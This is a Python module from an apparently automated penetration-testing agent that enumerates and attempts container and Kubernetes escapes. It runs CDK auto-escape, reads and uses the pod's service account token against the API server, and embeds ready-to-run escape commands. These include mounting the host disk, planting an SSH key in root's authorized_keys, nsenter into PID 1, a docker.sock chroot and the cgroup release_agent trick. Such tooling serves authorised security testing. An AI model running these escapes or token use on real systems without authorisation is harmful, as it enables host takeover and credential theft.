"""
container_escape_subagent.py — Container and namespace escape enumeration.

AGENT_NAME  : "privesc"
SUBAGENT_NAME: "container_escape"

Methodology:
  1. Detect container runtime (Docker, containerd, Podman, LXC, Kubernetes pod)
  2. Run CDK (Container DucK Knife) — auto-detects escape vectors
  3. Run deepce — Docker/container enumeration script
  4. Check: privileged flag, dangerous capabilities (SYS_ADMIN, NET_ADMIN, etc.)
  5. Check: Docker socket mount (/var/run/docker.sock)
  6. Check: host namespace shares (--pid=host, --net=host, --ipc=host)
  7. Check: /proc/1/cgroup to confirm containerisation
  8. Check: writable host paths mounted into container
  9. Kubernetes: service account token, RBAC permissions, metadata API
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

_CONTAINER_RE = re.compile(r"(docker|containerd|container|\.dockerenv|kubepods|lxc)", re.IGNORECASE)
_PRIVILEGED_RE = re.compile(r"(privileged\s*=\s*true|CapEff.*ffffffff|cap_sys_admin)", re.IGNORECASE)
_DOCKER_SOCK_RE = re.compile(r"/var/run/docker\.sock", re.IGNORECASE)
_DANGER_CAP_RE = re.compile(
    r"(cap_sys_admin|cap_sys_ptrace|cap_net_admin|cap_dac_override|"
    r"cap_dac_read_search|cap_setuid|cap_setgid|cap_sys_rawio|cap_sys_module)",
    re.IGNORECASE,
)
_K8S_RE = re.compile(r"(kubernetes|kubectl|kube-apiserver|serviceaccount|\.kube)", re.IGNORECASE)
_HOST_MOUNT_RE = re.compile(r"(host.*path|hostPath|proc.*host|/host)", re.IGNORECASE)
_CGROUP_RE = re.compile(r"(cgroup.*docker|cpuset.*kubepods|devices.*lxc)", re.IGNORECASE)
_ESCAPE_SUCCESS_RE = re.compile(r"(escape.*succeed|root.*shell|host.*root|breakout.*success)", re.IGNORECASE)


class ContainerEscapeSubagent(BaseSubagent):
    """Enumerate container escape vectors and attempt safe escape techniques."""

    AGENT_NAME: str = "privesc"
    SUBAGENT_NAME: str = "container_escape"

    async def run(self, target: str, **kwargs: Any) -> SubagentResult:
        """
        Enumerate container escape attack surface.

        Parameters
        ----------
        target:
            Container host IP or localhost (``127.0.0.1``) if running inside container.

        Returns
        -------
        SubagentResult
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        # ── 1. Confirm container environment ─────────────────────────────
        cgroup_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"cat /proc/1/cgroup 2>/dev/null; cat /.dockerenv 2>/dev/null && echo 'DOCKERENV_EXISTS'; "
                        "systemd-detect-virt --container 2>/dev/null\""},
        )

        is_container = bool(_CONTAINER_RE.search(cgroup_output)) or "DOCKERENV_EXISTS" in cgroup_output
        if not is_container:
            await self.store_finding(Finding(
                title="Container Escape: Target Does Not Appear to Be Containerised",
                description=(
                    "No container indicators found (no /.dockerenv, no Docker cgroup entries). "
                    "Target may be a bare metal or VM host. Container escape techniques are not applicable."
                ),
                severity="INFO",
                evidence=cgroup_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1611",
            ))
            result.findings = list(self._findings)
            result.tool_outputs = dict(self._tool_outputs)
            return result

        await self.store_finding(Finding(
            title="Container Escape: Container Environment Confirmed",
            description="Target is running inside a container (Docker/containerd/LXC). "
                        "Proceeding with container escape enumeration.",
            severity="INFO",
            evidence=cgroup_output[:500],
            tool="bash",
            host=target,
            mitre_technique="T1611",
        ))

        # ── 2. Check capabilities ─────────────────────────────────────────
        cap_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"capsh --print 2>/dev/null; cat /proc/self/status | grep Cap 2>/dev/null\""},
        )

        danger_caps = list(set(_DANGER_CAP_RE.findall(cap_output)))
        is_privileged = bool(_PRIVILEGED_RE.search(cap_output))

        if is_privileged:
            await self.store_finding(Finding(
                title="Container Escape: Privileged Container Detected — Host Root Accessible",
                description=(
                    "Container is running in PRIVILEGED mode (CapEff = ffffffffffffffff). "
                    "All host capabilities are granted. "
                    "The container can mount host filesystems, load kernel modules, "
                    "and access host devices — trivial escape to host root."
                ),
                severity="CRITICAL",
                evidence=cap_output[:1000],
                tool="bash",
                host=target,
                mitre_technique="T1611",
                exploit_suggestion=(
                    "Mount host root: mkdir /tmp/hostfs && mount /dev/sda1 /tmp/hostfs. "
                    "Add SSH key: echo 'ssh-rsa ...' >> /tmp/hostfs/root/.ssh/authorized_keys. "
                    "Or: nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
                ),
            ))
        elif danger_caps:
            await self.store_finding(Finding(
                title=f"Container Escape: Dangerous Capabilities — {', '.join(danger_caps[:4])}",
                description=(
                    f"Container has dangerous capabilities: {', '.join(danger_caps)}. "
                    "SYS_ADMIN allows mounting and cgroup-based escape. "
                    "SYS_PTRACE allows process injection into host processes. "
                    "NET_ADMIN allows network namespace manipulation."
                ),
                severity="HIGH",
                evidence=cap_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1611",
                exploit_suggestion=(
                    "SYS_ADMIN: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
                    "echo 1 > /tmp/cgrp/release_agent (cgroup notify_on_release escape). "
                    "SYS_PTRACE: inject shellcode into host PID 1."
                ),
            ))

        # ── 3. Docker socket mount check ──────────────────────────────────
        mount_output = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"mount | grep docker.sock; ls -la /var/run/docker.sock 2>/dev/null\""},
        )

        if _DOCKER_SOCK_RE.search(mount_output):
            await self.store_finding(Finding(
                title="Container Escape: Docker Socket Mounted — Trivial Host Escape",
                description=(
                    "/var/run/docker.sock is mounted into the container. "
                    "This gives full Docker daemon control, allowing the creation of a "
                    "privileged container with the host filesystem mounted — trivial root escape."
                ),
                severity="CRITICAL",
                evidence=mount_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1611",
                exploit_suggestion=(
                    "Run: docker -H unix:///var/run/docker.sock run -v /:/host -it --rm "
                    "alpine chroot /host /bin/bash. "
                    "Or: curl -s --unix-socket /var/run/docker.sock http://localhost/images/json"
                ),
            ))

        # ── 4. Host namespace sharing ─────────────────────────────────────
        ns_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"ls -la /proc/1/ns/ 2>/dev/null; "
                "cat /proc/self/mountinfo 2>/dev/null | grep 'proc\\|sys\\|host'"
                "\""
            )},
        )

        pid_ns_shared = "pid" in ns_output and re.search(r"pid.*->.*1", ns_output)
        net_ns_shared = "net" in ns_output and re.search(r"net.*->.*1", ns_output)
        if pid_ns_shared or net_ns_shared:
            await self.store_finding(Finding(
                title="Container Escape: Host Namespace Shared",
                description=(
                    f"Container shares host namespaces: "
                    f"PID namespace: {pid_ns_shared}, Network namespace: {net_ns_shared}. "
                    "Shared PID namespace allows process injection via /proc/[PID]/mem. "
                    "Shared network namespace exposes all host network interfaces."
                ),
                severity="HIGH",
                evidence=ns_output[:500],
                tool="bash",
                host=target,
                mitre_technique="T1611",
                exploit_suggestion=(
                    "With shared PID: nsenter -t 1 -m -u -n -i /bin/bash (requires SYS_ADMIN). "
                    "Or inject into PID 1: /proc/1/mem write technique."
                ),
            ))

        # ── 5. CDK auto-enumeration ───────────────────────────────────────
        cdk_output = await self.collect_tool(
            "cdk",
            target,
            {"options": "auto-escape 2>&1 || cdk evaluate 2>&1"},
        )

        if cdk_output:
            escape_found = bool(_ESCAPE_SUCCESS_RE.search(cdk_output))
            await self.store_finding(Finding(
                title=f"CDK Container Analysis: {'Escape Vector Found' if escape_found else 'Enumeration Complete'}",
                description=(
                    "CDK (Container DucK Knife) automated container escape analysis completed. "
                    f"Escape technique {'succeeded' if escape_found else 'not automatically achieved — review output'}."
                ),
                severity="CRITICAL" if escape_found else "MEDIUM",
                evidence=cdk_output[:2000],
                tool="cdk",
                host=target,
                mitre_technique="T1611",
                exploit_suggestion="Review CDK output for specific escape vector commands.",
            ))

        # ── 6. Kubernetes service account check ───────────────────────────
        k8s_output = await self.collect_tool(
            "bash",
            target,
            {"options": (
                "-c \"ls /var/run/secrets/kubernetes.io/ 2>/dev/null; "
                "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); "
                "APISERVER=https://kubernetes.default.svc; "
                "curl -sk --header \\\"Authorization: Bearer $TOKEN\\\" $APISERVER/api/v1/namespaces 2>&1 | head -20\""
            )},
        )

        if _K8S_RE.search(k8s_output):
            await self.store_finding(Finding(
                title="Kubernetes: Service Account Token Found — API Server Accessible",
                description=(
                    "Running inside a Kubernetes pod with a mounted service account token. "
                    "The token may have RBAC permissions to create pods, read secrets, "
                    "or perform other privileged operations on the cluster."
                ),
                severity="HIGH",
                evidence=k8s_output[:1000],
                tool="bash",
                host=target,
                mitre_technique="T1552.007",
                exploit_suggestion=(
                    "Check RBAC: kubectl --token=$TOKEN auth can-i --list. "
                    "If create pods: deploy privileged pod with host mount. "
                    "Check secrets: kubectl --token=$TOKEN get secrets -A"
                ),
            ))

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
